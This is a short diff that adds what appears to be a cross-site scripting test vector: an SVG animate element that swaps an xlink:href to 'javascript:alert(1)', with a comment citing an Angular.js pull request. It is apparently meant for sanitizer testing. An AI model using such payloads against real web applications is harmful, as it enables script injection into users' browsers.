@@ -1,0 +1,4 @@
+#
+# https://github.com/angular/angular.js/pull/11290
+#
+<animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" />
